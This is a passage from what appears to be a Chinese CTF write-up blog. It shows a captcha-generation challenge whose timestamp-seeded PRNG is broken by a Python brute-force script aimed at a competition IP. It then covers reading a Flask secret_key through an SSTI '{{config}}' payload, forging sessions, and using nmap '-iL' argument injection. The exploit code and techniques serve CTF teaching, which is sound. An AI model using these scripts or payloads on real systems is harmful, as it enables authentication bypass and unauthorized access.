punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>        x1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>        y1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>        x2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>        y2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>        w2 <span class="token operator">=</span> w <span class="token operator">+</span> abs<span class="token punctuation">(</span>x1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>x2<span class="token punctuation">)</span>        h2 <span class="token operator">=</span> h <span class="token operator">+</span> abs<span class="token punctuation">(</span>y1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>y2<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">(</span>            x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span>            <span class="token operator">-</span>x1<span class="token punctuation">,</span> h2 <span class="token operator">-</span> y2<span class="token punctuation">,</span>            w2 <span class="token operator">+</span> x2<span class="token punctuation">,</span> h2 <span class="token operator">+</span> y2<span class="token punctuation">,</span>            w2 <span class="token operator">-</span> x2<span class="token punctuation">,</span> <span class="token operator">-</span>y1<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>w2<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">,</span> QUAD<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        <span class="token keyword">return</span> im    <span class="token keyword">def</span> <span class="token function">create_captcha_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> background<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        image <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">,</span> background<span class="token punctuation">)</span>        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        images<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>Image<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            <span class="token keyword">if</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">:</span>                images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span>            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span>c<span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span>        text_width <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">]</span><span class="token punctuation">)</span>        width <span class="token operator">=</span> max<span class="token punctuation">(</span>text_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_width<span class="token punctuation">)</span>        image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>        average <span class="token operator">=</span> int<span class="token punctuation">(</span>text_width <span class="token operator">/</span> len<span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span>        rand <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token number">0.25</span> <span class="token operator">*</span> average<span class="token punctuation">)</span>        offset <span class="token operator">=</span> int<span class="token punctuation">(</span>average <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">:</span>            w<span class="token punctuation">,</span> h <span class="token operator">=</span> im<span class="token punctuation">.</span>size            mask <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>point<span class="token punctuation">(</span>self<span class="token punctuation">.</span>lookup_table<span class="token punctuation">)</span>            image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>im<span class="token punctuation">,</span> <span class="token punctuation">(</span>offset<span class="token punctuation">,</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_height <span class="token operator">-</span> h<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span>            offset <span class="token operator">=</span> offset <span class="token operator">+</span> w <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token operator">-</span>rand<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> width <span class="token operator">></span> self<span class="token punctuation">.</span>_width<span class="token punctuation">:</span>            image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> image    <span class="token keyword">def</span> <span class="token function">generate_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        background <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>        color <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>create_captcha_image<span class="token punctuation">(</span>chars<span class="token punctuation">,</span> color<span class="token punctuation">,</span> background<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_noise_dots<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_noise_curve<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>SMOOTH<span class="token punctuation">)</span>        <span class="token keyword">return</span> im    <span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>BytesIO<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        out <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>out<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>        out<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> out<span class="token punctuation">,</span> code    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> output<span class="token punctuation">:</span> str<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>Image<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>output<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>        <span class="token keyword">return</span> im<span class="token punctuation">,</span> code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而<code>/vip</code>是调用了<code>generate_code</code>方法生成验证码。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_code</span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        characters <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>characters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># I=I+1</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里编写爆破脚本的思路就有了，我们可以先访问一次<code>/catpcha</code>让他重置一下种子，因为题目设置的<code>key</code>是由当前时间戳加个随机数生成的，所以这个种子是可以通过遍历爆破就能拿到。又因为<code>random.choice</code>是伪随机的，所以只要爆破对了<code>key</code>正确的验证码就出来了。</p><p>不过这里有两个坑：</p><ol><li>第一次生成验证码必须实例化<code>Captcha(200, 80,key=key)</code>，宽高必须对应上，好像是<code>random</code>里调用了指定的宽高，这样就打乱了后续（第二次第三次）生成验证码的逻辑，导致爆破不出来。</li><li>公共靶场，可能有别人也在访问路由从而破坏成功率。</li></ol><p>考虑到上面两个因素，写下了如下脚本，就算有人捣乱但是也不可能一直捣乱，只要一直请求就好了，实际测试几秒钟就能跑出来。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">from</span> utils<span class="token punctuation">.</span>captcha <span class="token keyword">import</span> Captcha<span class="token punctuation">,</span>generate_codeflag<span class="token operator">=</span><span class="token boolean">False</span>url<span class="token operator">=</span><span class="token string">"http://124.70.33.170:23001/"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    uuu<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"captcha"</span>    number<span class="token operator">=</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>uuu<span class="token punctuation">)</span>    cc1<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>    i<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> randoms <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> number<span class="token operator">+</span>randoms        <span class="token comment" spellcheck="true"># key = </span>        gen <span class="token operator">=</span> Captcha<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#必须是填200,80.</span>        buf <span class="token punctuation">,</span> captcha_text <span class="token operator">=</span> gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># gen = Captcha(key=1698630385)</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(captcha)</span>        burp0_url <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"vip"</span>        burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001/"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">}</span>        burp0_json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"captcha"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>captcha<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># print(burp0_json)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> json<span class="token operator">=</span>burp0_json<span class="token punctuation">)</span>        cc2<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">if</span> cc1<span class="token operator">!=</span>cc2<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sucess"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>cc2<span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"找到了"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"没有找到，请重新运行"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sucess</span><span class="token comment" spellcheck="true">#eyJjYXB0Y2hhIjoieGRmQSIsInZpcCI6dHJ1ZX0.ZT8bDQ.JKzPFmo1IIlRlRxtBKT4Ut3tbms</span><span class="token comment" spellcheck="true">#找到了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="session伪造打SSTI"><a href="#session伪造打SSTI" class="headerlink" title="session伪造打SSTI"></a>session伪造打SSTI</h5><p>直接用<code>&#123;&#123;config&#125;&#125;</code>就行，多试几次，因为是随机<code>WAF</code>。多试几次就会遇到没有ban掉<code>config</code>的垃圾<code>WAF</code>了，设置成功就能直接读取到<code>secret_key</code>了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682680474.jpg" alt="1698682680474"></p><p>成功读取到<code>secret-key:16d07433931f178ff35c75e83924d5e9</code></p><p>伪造<code>session</code>打<code>ssti</code>即可。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682706411.jpg" alt="1698682706411"></p><p>带着<code>session</code>请求<code>/story</code>即可。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682734088.jpg" alt="1698682734088"></p><h4 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h4><p>第一道题直接上车了，就是<code>-iL </code>读文件然后输出到主页上。参数注入的题我个人不是很喜欢，并且自己也不擅长就没看。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XSS </tag>
            
            <tag> SSTI </tag>
            
            <tag> 验证码逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖掘某cms漏洞总结</title>
      <link href="/2023/09/20/wa-jue-mou-cms-qian-tai-rce-zong-jie/"/>
      <url>/2023/09/20/wa-jue-mou-cms-qian-tai-rce-zong-jie/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="edaba05b86aed7862d04796a2db7fd6af91765e409231bb0bcb64f2af6b9c514">84f9431166592793d38f2e967857fd87bd5afbd0a6559a322fae476d862a60be2117f09b7a7ac634865a0dba9e5a26bbd239ff0482f89143cd404cda297fc79255d838fd4a0361f03c1c10ac85707fe43b67a9bf6a445932d8f29bddb0da8da3a3c434edf1260badc9c00bbe0cf341bf8382f517ba907e2d2281edfba22d694ced0a50fd3b1b5ffade581a3ae9dbdc28ca85ea9240705b9a11b0749f8583eb930e32da447333b261c8f5cd713eac7c50daf2c3de2627dd1020983291022d2f14cb3e6a6ee6e5f317e9be07080e13fcbf084da12e18773f06b2e7d2ff9e1137d5dcab731088bb0e3fb619026a4beffb4436e69a013341de1d3f484932d1ac11e06d9da5901d80d2f3fd1018ea34d5d54b0970b8306507fe2c6ab3fb1b0c14d84e7b7a83f28af64da75f70e65546a2a1924aded2ad8bc4f3d15fd19b6a063124fd5d4a2857452e4b6c9bf211b9d0b32f98c049e4140a2b022a12608e4fcf022b4996f4a016e7f5a057e466af038a635aa3a09fd5467484cee94e507bc672f92be474e7a4ea808f40afc9db01a69a06542d19f698a7b6efc1adbfb93ea028363efac3e1de35164da66cc3d5e4f1117a07afdd27eb6ee2b1d35bd02bddc1626439d6c5d8d96d8a9c9218cf8d19e0c4e95f459a61a3b6b445c9ca9e18b5ecd14fede8d6a15a5bf77066277fece62ee261e052fd5d8e4fa13076e84eabde4e7e7ffb38955e3733818ff9b11b68e70f287e8bb75f9c7b3ffae88229118641deb3a4bb6dd763f6f54c25779c13cbb1714cf1c76da57e3167c8f65b2be3134eb41b0545fc80bb9117c5e7ae4554ec595802ecbea50e7c4859d6cc584dd3f0a0eb72a2e8961fe39766dddb85be30015c91bf1ed5277b80bd0a87be69e27eb07735f7f3fffb53dd22089bb8eb1220de5eba74bdfabbf4650ffac6869e907723a7a82bd557ef89cc2cd83c6d95aa286f5326e01aa7ab521a774401b31bae57b7ba094d00e2d65ecd45950b01a87c7aa412414c535427907fb088bb1d47509ea22164e747634ce052f12bc90e12c0c020c1cc4be421ab8712329901aef7209bcd9c97fce16b0c74f670866d8278dbaa93ccad1dd69cab6d4e579afd8dd3fb92da2e8e4f7995a7fb83971df198fd6b22d42a393674f170f9a6fb39ec0997b3429b1f3b70ba8a55c62cbe11ba323292cc0cc67b6595da88f525743d3dabdac833ac140f3a297e7a28fe089f58e6a7d15adf5bb16061d00f9df629d71bfb9a626c58b291e860294ecb408745cf2c272f00b51948498fe0f6d1368f15f0e33a2a3d723cdb6b5b0b2e42a262253b974ebdab5ac67d601827543f231ba26144a855fe0d1d03aec92f167ec4d97cb8e753e80b6b5c5d0b77fa278c353d74c87afc1153b263b01b2b88025368a70bbc4cfc379b365e8ef5e0fc330a8e02d7f68dce7eb58e8afeceb628ab66772d31eeb60d41ec5ab3a63365312448f1ac5aa03ea67f34a94bdcdf783b418e0d82530982c4ebfbf5a2875fdd989b1147a566fa321de1aff37417eb3fecee674eb2afaacff2a1a0afcd25e2e3cc8849498018ca4f5b033ec1ca25045b1f39b2ea8c8977e39c70412929452f087cb12327ea05ec9069b41879f4c11e6690ca25055db664930d1ef6ee4e5658f34ecb1529fd619f77b83abdcf856cf76f47108d3d8e6f2a3737463828b58a948b56f6f9d851d5bac74a57cf8df21f864fa643b9d695e23aa5e34b3bbe35d37a310a90eb4a263192116939a232340d0a5afc7f65d5d1a6446758e43e41436c76f77ff48c40efe53ab82accf93497b2484edee8985a8025dc8f82bd4f1bb140f3d8a3713f6f4329b3fc1cf18166fec0038cfa7e3a732dc7dc3f1ddd2eb4b1cd0ab58c1c6a3f16ea90b7a7d5cd969f748c494f7d5d6d0585d7f00904522687e5c6f263fdcc5e912ba990d992561dc4a06a62e04cd43e4d0e4c2a6d01a009fb8c1ba731eab90cdaab9a81938ab0671abfc3a76d724ff8b6731264c91ce7e50e07debd5b2670d0a8a0c9bb845089e062ecd8cb0ecf6f1033807359460130a0620e3a1ac9db40c3c1080c9047d3f9103a4d3efc450773dd8cc6a037c05d09f48ff0c71e2ebd688b49c43efd24707d500bf7b02ee4c490bc9db6df24bbd06ee4cfcf09d8740048edfc51226804b3e63e46c80e17c874cf82214aada50c552d5c9989e5b674b0ae5234ebb62fe12bff8124b3f0de1898df47153f456e30ad2e321c2b55b9dab7d9155399cf38add50641e18785495dd4425792084b8ea507c4e01558246509bf959c66176e38968da6f1e44060c40b5e923637c8329adc8b38914bbb2d8b3cae0e4a415f2f7f66ee736f9b9611ba0842dad5cb0d0e9821854fba43922f3b879ebb68560718050400bd1012a085b3c5913731cf19e7b792f32cc562d8aca05e3c32b801be238f730b8e7bbca546fa1180cba22308309b24ed9d58b7127f470168dc8afab335f24e3dd7ec1ae9b8616f27473977ea820c9bbaefc0879b88a2888b71ae699870c2765ac6d260671cb46e6c0c8c2c1d4cfeaee75e14205f13b9d48d2b58f2931a93ee93e00b758a1beaaadd69794fc04696593e8d03a8a5cd0bdfc1418c8f6b1d58c81e8b4f50f2a9150fd3cde7efda36db92770b45071ca9f01b1933ff3bbdce2b807312c0f6bc660bae3d87bf9b604bff9f024d03950c20fa7ab98facc0d7b3f91d040524ed8f527d0dfbdd79fd0a0f89893c212fcb723730ece9b094e8221dd1de70af89b73afe6aeeea366d3eab2f3a899652d5311bf2f92dc7dabf4ebe8458f75a8b6598688baeef3a1587bdd9893c45b047d52c7cbf6f6c41e62c9a7f357d45f34777d6c5bdf00b655346ce870f4623bcf4b62f2396263ea23f324d78f8b827a117cd69e47ddfc4941d7524951f62d5127dc559207171d2a7f2c472848399f3dc5088b1d6a1e633bc025b7e3a415d675c818665894b94e7954a97e01fee6ce99e83aa394302846a136e6088582e8d2808491b19448d0c99ba27f50be260cc2d020e42964bc88a4bd91a020d585aef6835dd8bbfc37fa6b29cba2063a130fe1a69f66e932713bc1687f2a936a8364e32d42242547b2a9c0e11267addcac23d43c373982aea015d0149e34526b4747941e062e0b5ca29d24f88862ec9715253f34d0a59c149ba64053b708d2c8b4cfef1593134efafba711f6572576a592432e1c12cb1166a613b6e20b4c93355ff21fca1dcb12beb23e53b0885ea1170201e7b665e5c20bf10997f2d04d97aeb4a69fe3785b9802f5292e83a6132f9a10dadb9111256d53a6a085038d5ca42be044b4173380abc3430770e6fd34c1a53a620f58d39b156affe32139e046eee20409dee1b974a3da2cf5f43da4a638315d6d2cd11d6f8f2cf3c1b54d22604e20ddde73b87328e3560d9b7094595704d0c394c54bf5ccf2e4c2f609c00f18eb254cb70f7d32fec7acf14bfbbeb7d56efff37e640b842dd36f158577df66a1dc875835a0ff94104a381010640cce8e0eb197a85cf192dfa4af18dc84d4bbb80c2707fab77075864877f91054d32ad8934b80affdb655321a0a36b6c9f9ad49f001c26cfbb2a6197b49e9a115d7e2de32415e58a378cc13113a29d2ae26ec449b95759704f7cde6a90d8e6bd48a551558f4c2f9071ea6493836a43b98d2617925e65bb34d7a1c9957bec92b588cc2fc652ae5afa36ae72fff3fe4e8c2abad561b77bd8c0f96b614f15077c79d5a0e087158aeddcd7ae3b872154203dab6a27f21b198b88eeab3f495616a259816c37831c18bd985d9831f9a17aca8a0c65bfa7e3425684a29936bd5e099d5f9f1443d92c3fd1cd93c